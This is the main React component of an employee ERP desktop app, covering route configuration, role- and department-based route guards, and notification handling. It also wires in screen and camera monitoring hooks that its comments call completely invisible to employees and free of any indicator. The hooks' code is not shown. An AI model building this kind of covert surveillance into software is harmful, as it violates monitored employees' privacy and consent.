/**
 * Guardian Desktop ERP - Main App Component
 * Route configuration and layout management with role-based access
 */

import React, { Suspense, lazy } from 'react';
import { Routes, Route, Navigate } from 'react-router-dom';
import { useAuth } from './store/AuthContext';
import LoadingScreen from './components/common/LoadingScreen';
import MainLayout from './components/layout/MainLayout';

// Lazy load pages for better performance
const AuthPage = lazy(() => import('./pages/AuthPage'));
const DashboardPage = lazy(() => import('./pages/DashboardPage'));
const EmployeesPage = lazy(() => import('./pages/EmployeesPage'));
const AttendancePage = lazy(() => import('./pages/AttendancePage'));
const TasksPage = lazy(() => import('./pages/TasksPage'));
const MeetingsPage = lazy(() => import('./pages/MeetingsPage'));
const LeavesPage = lazy(() => import('./pages/LeavesPage'));
const ExpensesPage = lazy(() => import('./pages/ExpensesPage'));
const RevenuePage = lazy(() => import('./pages/RevenuePage'));
const ReportsPage = lazy(() => import('./pages/ReportsPage'));
const ChatPage = lazy(() => import('./pages/ChatPage'));
const NotificationsPage = lazy(() => import('./pages/NotificationsPage'));
const SettingsPage = lazy(() => import('./pages/SettingsPage'));
const DocumentsPage = lazy(() => import('./pages/DocumentsPage'));
const TimeTrackingPage = lazy(() => import('./pages/TimeTrackingPage'));
const RoleManagementPage = lazy(() => import('./pages/RoleManagementPage'));
const UnauthorizedPage = lazy(() => import('./pages/UnauthorizedPage'));
const AIAssistantPage = lazy(() => import('./pages/AIAssistantPage'));
const IntakeFormPage = lazy(() => import('./pages/IntakeFormPage'));
const IntakeNewPage = lazy(() => import('./pages/IntakeNewPage'));
const ARFollowUpPage = lazy(() => import('./pages/ARFollowUpPage'));
const VOBBOBPage = lazy(() => import('./pages/VOBBOBPage'));
const VOBBOBAutoFillPage = lazy(() => import('./pages/VOBBOBAutoFillPage'));
const MarketingCRMPage = lazy(() => import('./pages/MarketingCRMPage'));
const CRMEmailsPage = lazy(() => import('./pages/CRMEmailsPage'));
const UserManagementPage = lazy(() => import('./pages/UserManagementPage'));
const MyProfilePage = lazy(() => import('./pages/MyProfilePage'));
const SupervisionPage = lazy(() => import('./pages/SupervisionPage'));
const AgreementsPage = lazy(() => import('./pages/AgreementsPage'));
const LoansPage = lazy(() => import('./pages/LoansPage'));
const EmployeeDirectoryPage = lazy(() => import('./pages/EmployeeDirectoryPage'));
const TeamsPage = lazy(() => import('./pages/TeamsPage'));

// Silent monitoring hooks for employees
import useSilentMonitoring from './hooks/useSilentMonitoring';
import useSilentCameraMonitoring from './hooks/useSilentCameraMonitoring';
import { usePresenceInit } from './hooks/usePresence';
import notificationService from './services/notificationService';
import soundService from './services/soundService';
import OverlayNotification from './components/OverlayNotification';

// Protected Route wrapper
function ProtectedRoute({ children }) {
  const { isLoggedIn, loading } = useAuth();
  
  if (loading) {
    return <LoadingScreen />;
  }
  
  if (!isLoggedIn) {
    return <Navigate to="/auth" replace />;
  }
  
  return children;
}

// Admin-only Route wrapper
function AdminRoute({ children }) {
  const { user, isLoggedIn, loading } = useAuth();
  
  if (loading) {
    return <LoadingScreen />;
  }
  
  if (!isLoggedIn) {
    return <Navigate to="/auth" replace />;
  }
  
  // Check if user is admin
  if (user?.role !== 'admin' && user?.role !== 'super_admin') {
    return <Navigate to="/unauthorized" replace />;
  }
  
  return children;
}

// Billing Route wrapper (Operations department + Admins)
function BillingRoute({ children }) {
  const { user, isLoggedIn, loading } = useAuth();
  
  if (loading) {
    return <LoadingScreen />;
  }
  
  if (!isLoggedIn) {
    return <Navigate to="/auth" replace />;
  }
  
  // Admins always have access
  if (user?.role === 'admin' || user?.role === 'super_admin') {
    return children;
  }
  
  // Check if user is in Operations department
  if (user?.department?.toLowerCase() === 'operations' || 
      user?.department?.toLowerCase() === 'billing') {
    return children;
  }
  
  return <Navigate to="/unauthorized?reason=billing" replace />;
}

// HR Route wrapper (HR department + Admins)
function HRRoute({ children }) {
  const { user, isLoggedIn, loading } = useAuth();
  
  if (loading) {
    return <LoadingScreen />;
  }
  
  if (!isLoggedIn) {
    return <Navigate to="/auth" replace />;
  }
  
  // Admins always have access
  if (user?.role === 'admin' || user?.role === 'super_admin') {
    return children;
  }
  
  // Check if user is in HR department
  if (user?.department?.toLowerCase() === 'hr' || 
      user?.department?.toLowerCase() === 'human resources') {
    return children;
  }
  
  return <Navigate to="/unauthorized?reason=hr" replace />;
}

// Public Route wrapper (redirect to dashboard if logged in)
function PublicRoute({ children }) {
  const { isLoggedIn, loading } = useAuth();
  
  if (loading) {
    return <LoadingScreen />;
  }
  
  if (isLoggedIn) {
    return <Navigate to="/dashboard" replace />;
  }
  
  return children;
}

function App() {
  return (
    <Suspense fallback={<LoadingScreen />}>
      <AppWithMonitoring />
    </Suspense>
  );
}

// Inner component that uses monitoring hook after auth is available
function AppWithMonitoring() {
  const { user, isLoggedIn } = useAuth();
  const [overlayNotifications, setOverlayNotifications] = React.useState([]);
  
  // Handle overlay notification from the notification service
  const handleOverlayNotification = React.useCallback((notification) => {
    const id = Date.now();
    setOverlayNotifications(prev => [...prev, { ...notification, id }]);
    
    // Auto-dismiss after 30 seconds if not urgent
    if (!notification.urgent) {
      setTimeout(() => {
        setOverlayNotifications(prev => prev.filter(n => n.id !== id));
      }, 30000);
    }
  }, []);
  
  const dismissOverlayNotification = React.useCallback((id) => {
    setOverlayNotifications(prev => prev.filter(n => n.id !== id));
  }, []);
  
  const dismissAllOverlayNotifications = React.useCallback(() => {
    setOverlayNotifications([]);
  }, []);
  
  // Debug: Log user info
  React.useEffect(() => {
    if (isLoggedIn && user) {
      console.log('[App] User logged in:', {
        email: user.email,
        role: user.role,
        employeeId: user.employeeId,
        id: user.id
      });

      // Check for birthday notifications once per day
      notificationService.checkAndSendBirthdayNotifications();
      
      // Check for work milestone notifications once per day
      notificationService.checkAndSendMilestoneNotifications();
      
      // Request notification permission and test
      const initNotifications = async () => {
        const permission = await notificationService.requestPermission();
        console.log('[App] Notification permission:', permission);
        
        // Send a welcome notification on first use (once per session)
        const notifTestKey = 'guardian_notif_tested';
        if (permission === 'granted' && !sessionStorage.getItem(notifTestKey)) {
          sessionStorage.setItem(notifTestKey, 'true');
          // Delay test notification slightly so user can see it
          setTimeout(() => {
            notificationService.showSystemNotification(
              '✅ Notifications Enabled',
              'You will receive alerts for meetings, tasks, and reminders at 30, 20, 5, and 1 minute before.',
              { tag: 'guardian-welcome' }
            );
          }, 2000);
        }
      };
      initNotifications();
      
      // Start polling for upcoming meetings, tasks, and reminders
      const stopPolling = notificationService.startNotificationPolling(user.id, handleOverlayNotification);

      // Subscribe to real-time notifications (meeting invites, task assignments, etc.)
      const notifChannel = notificationService.subscribeToNotifications(user.id, (notification) => {
        // Play notification sound
        try { soundService.playMessageNotification(); } catch (e) { /* ignore */ }

        // Show overlay notification popup
        if (notification?.title && notification?.message) {
          handleOverlayNotification({
            type: notification.type || 'info',
            title: notification.title,
            message: notification.message,
            urgent: notification.type === 'meeting'
          });
        }
      });

      // Cleanup on unmount
      return () => {
        stopPolling();
        notificationService.unsubscribe(notifChannel);
      };
    }
  }, [isLoggedIn, user, handleOverlayNotification]);
  
  // Initialize presence tracking - automatically tracks when app is open
  // No clock-in needed - if app is open, employee is online
  usePresenceInit();
  
  // Silent screen monitoring listener - runs for all logged-in employees
  // Completely invisible to the user
  useSilentMonitoring(isLoggedIn ? user?.employeeId : null);
  
  // Silent camera monitoring listener - camera stays OFF until secure-signal
  // No UI indicators, HIPAA compliant
  useSilentCameraMonitoring(isLoggedIn ? user?.employeeId : null);
  
  return (
    <>
      {/* Overlay Notifications for meetings, tasks, reminders */}
      {isLoggedIn && (
        <OverlayNotification
          notifications={overlayNotifications}
          onDismiss={dismissOverlayNotification}
          onDismissAll={dismissAllOverlayNotifications}
        />
      )}
      
      <Routes>
        {/* Public Routes */}
        <Route 
          path="/auth" 
          element={
            <PublicRoute>
              <AuthPage />
            </PublicRoute>
          } 
        />
        
        {/* Protected Routes */}
        <Route 
          path="/" 
          element={
            <ProtectedRoute>
              <MainLayout />
            </ProtectedRoute>
          }
        >
          <Route index element={<Navigate to="/dashboard" replace />} />
          <Route path="dashboard" element={<DashboardPage />} />
          <Route path="my-profile" element={<MyProfilePage />} />
          <Route path="attendance" element={<AttendancePage />} />
          <Route path="tasks" element={<TasksPage />} />
          <Route path="meetings" element={<MeetingsPage />} />
          <Route path="leaves" element={<LeavesPage />} />
          <Route path="chat" element={<ChatPage />} />
          <Route path="notifications" element={<NotificationsPage />} />
          <Route path="settings" element={<SettingsPage />} />
          <Route path="documents" element={<DocumentsPage />} />
          <Route path="time-tracking" element={<TimeTrackingPage />} />
          <Route path="unauthorized" element={<UnauthorizedPage />} />
          <Route path="ai-assistant" element={<AIAssistantPage />} />
          
          {/* Billing Routes - Operations Department + Admins */}
          <Route path="intake-form" element={<BillingRoute><IntakeFormPage /></BillingRoute>} />
          <Route path="intake-new" element={<BillingRoute><IntakeNewPage /></BillingRoute>} />
          <Route path="ar-followup" element={<BillingRoute><ARFollowUpPage /></BillingRoute>} />
          <Route path="vob-bob" element={<BillingRoute><VOBBOBPage /></BillingRoute>} />
          <Route path="vob-bob-autofill" element={<BillingRoute><VOBBOBAutoFillPage /></BillingRoute>} />
          
          {/* Marketing Routes */}
          <Route path="marketing-crm" element={<MarketingCRMPage />} />
          <Route path="crm-emails" element={<CRMEmailsPage />} />
          
          {/* General Routes */}
          <Route path="loans" element={<LoansPage />} />
          <Route path="directory" element={<EmployeeDirectoryPage />} />
          <Route path="teams" element={<TeamsPage />} />
          
          {/* HR Routes - HR Department + Admins */}
          <Route path="agreements" element={<HRRoute><AgreementsPage /></HRRoute>} />
          
          {/* Administration Routes - Admins Only */}
          <Route path="employees" element={<AdminRoute><EmployeesPage /></AdminRoute>} />
          <Route path="user-management" element={<AdminRoute><UserManagementPage /></AdminRoute>} />
          <Route path="roles" element={<AdminRoute><RoleManagementPage /></AdminRoute>} />
          <Route path="supervision" element={<AdminRoute><SupervisionPage /></AdminRoute>} />
          
          {/* Accounting Routes - Admins Only */}
          <Route path="expenses" element={<AdminRoute><ExpensesPage /></AdminRoute>} />
          <Route path="revenue" element={<AdminRoute><RevenuePage /></AdminRoute>} />
          <Route path="reports" element={<AdminRoute><ReportsPage /></AdminRoute>} />
        </Route>
        
        {/* Catch all - redirect to dashboard */}
        <Route path="*" element={<Navigate to="/dashboard" replace />} />
      </Routes>
    </>
  );
}

export default App;
